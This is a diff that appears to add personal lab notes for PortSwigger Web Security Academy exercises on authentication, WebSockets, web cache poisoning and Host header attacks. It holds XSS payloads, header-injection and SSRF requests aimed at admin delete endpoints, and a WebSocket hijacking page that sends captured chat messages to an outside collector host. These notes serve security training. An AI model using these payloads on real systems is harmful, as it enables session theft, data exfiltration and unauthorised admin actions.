@@ -563,7 +563,118 @@ Referer: https://0a590035045fa8b680f3f8cb00ef0050.web-security-academy.net/admin
 
 ## Authentication
 ### Notes
+- [Usernames list](https://portswigger.net/web-security/authentication/auth-lab-usernames)
+- [Passowrds list](https://portswigger.net/web-security/authentication/auth-lab-passwords)
+
 ### Labs
 ```sh
+# Username enumeration via different responses
+use burp intruder
+# 2FA simple bypass
+skip 2FA by go to /my-account after login
+# Password reset broken logic
+temp-forgot-password-token=jshqm0jq81le9fz4r8unmk4dbhcb2dvq&username=carlos&new-password-1=carlos&new-password-2=carlos (change username to carlos)
+# Username enumeration via subtly different
+the invalid one has '.', use regex to do
+# Username enumeration via response timing
+use long password and observe response timing
+# Broken brute-force protection, IP block
 
+```
+
+## WebSockets
+### Notes
+### Labs
+{% raw %}
+```html
+<!-- Manipulating WebSocket messages to exploit vulnerabilities -->
+<img src='x' onerror=alert()>
+<!-- Cross-site WebSocket hijacking -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>WebSocket Hijacking</title>
+</head>
+<body>
+    <script>
+        let ws = new WebSocket(
+            "wss://0a89008904d0aba580bb26bc001d00fc.web-security-academy.net/chat"
+        );
+
+        ws.onopen = function () {
+            ws.send("READY");
+        };
+
+        ws.onmessage = function (evt) {
+            let message = evt.data;
+
+            fetch("https://3cgq4bces777ofybb1imqi3kcbi26suh.oastify.com", {
+                method: "POST",
+                body: message,
+                mode: "no-cors"
+            });
+        };
+    </script>
+</body>
+</html>
+<!-- Manipulating the WebSocket handshake to exploit vulnerabilities -->
+Lab is not available at the moment (15/05/2026)
+```
+{% endraw %}
+
+## Web cache poisoning
+### Notes
+- First, find `unkeyed input` using Param Miner in Burp Suite
+- Second, play around with it until you know how the processes work
+
+### Labs
+{% raw %}
+```html
+<!-- Web cache poisoning with an unkeyed header -->
+X-Forwarded-Host: exploit-0afa002d03f7f78980308e81012e003e.exploit-server.net (alert(document.cookie))
+<!-- Web cache poisoning with an unkeyed cookie -->
+Cookie: session=YjkgYlr9bBoNtn5DFx1Nng6DTtSdaEff; fehost=a"}</script><script>alert(1)</script>
+<!-- Web cache poisoning with multiple headers -->
+X-Forwarded-Scheme: http
+X-Forwarded-Host: exploit-0ab700ab03aee45283a16d4d013b00b7.exploit-server.net
+<!-- Targeted web cache poisoning using an unknown header -->
+X-Host: exploit-0aa3001e0446812880acc51501990008.exploit-server.net
+User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+<!-- Web cache poisoning via an unkeyed query string -->
+GET /?cb=dschbsnjdchsjdc'/><script>alert(1)</script>
+<!-- Web cache poisoning via an unkeyed query parameter -->
+GET /?utm_content=adshbdfjanbhfjahsvbhd'/><script>alert(1)</script>
+<!-- Parameter cloaking -->
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=1;callback=alert(1)
+<!-- Web cache poisoning via a fat GET request -->
+
+<!-- URL normalization -->
+
+```
+{% endraw %}
+
+## HTTP Host header attacks
+### Notes
+### Labs
+```sh
+# Basic password reset poisoning
+change host header to exploit sever and also change username param to target user
+# Host header authentication bypass
+GET /admin/delete?username=carlos HTTP/2
+Host: localhost
+# Web cache poisoning via ambiguous requests
+GET / HTTP/1.1
+Host: 0a90005003b18f92809b12b800080074.h1-web-security-academy.net
+Host: exploit-0a1c004e034b8faf801b1171014700de.exploit-server.net
+# Routing-based SSRF
+GET /admin/delete?csrf=sTBismvtETaM0k2LIaEqNYAgn63Zzr3K&username=carlos HTTP/2
+Host: 192.168.0.57
+# SSRF via flawed request parsing
+GET https://0add00b703ad533c8300ec4400740027.web-security-academy.net/admin/delete?csrf=IX3sMhXZclYuXy3rsKLO0cCDxb76QNW7&username=carlos HTTP/2
+Host: 192.168.0.231
+# Host validation bypass via connection state attack (a bit complicated and have to check this manually)
+GET /admin/delete?csrf=NYJGaBefh8YmRzojOkuIilHcF6M4cmh5&username=carlos HTTP/1.1
+Host: 192.168.0.1
 ```
